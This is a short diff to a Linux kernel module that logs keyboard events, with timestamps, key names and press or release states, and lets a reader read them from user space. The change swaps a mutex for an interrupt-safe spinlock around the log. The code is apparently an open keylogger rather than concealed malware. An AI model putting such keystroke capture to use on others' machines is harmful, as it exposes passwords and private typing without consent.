@@ -17,7 +17,6 @@
 extern const struct s_key keys_table[];
 
 static LIST_HEAD(keystroke_list);
-static DEFINE_MUTEX(log_mutex);
 static DEFINE_SPINLOCK(log_spinlock);
 
 static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
@@ -26,11 +25,12 @@ static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *
 	char			*tmp_buf;
 	size_t			total_size = 0;
 	ssize_t			ret = 0;
+	unsigned long		flags;
 
 	tmp_buf = kmalloc(1024 * 64, GFP_KERNEL);
 	if (!tmp_buf)
 		return -ENOMEM;
-	mutex_lock(&log_mutex);
+	spin_lock_irqsave(&log_spinlock, flags);
 	list_for_each_entry(entry, &keystroke_list, list) {
 		int	n = snprintf(tmp_buf + total_size, 1024 * 64 - total_size,
 				     "%02d:%02d:%02d %s (%lld) %s\n",
@@ -39,7 +39,7 @@ static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *
 				     entry->down ? "Pressed" : "Released");
 		total_size += n;
 	}
-	mutex_unlock(&log_mutex);
+	spin_unlock_irqrestore(&log_spinlock, flags);
 	if (*off >= total_size) {
 		ret = 0;
 		goto out;
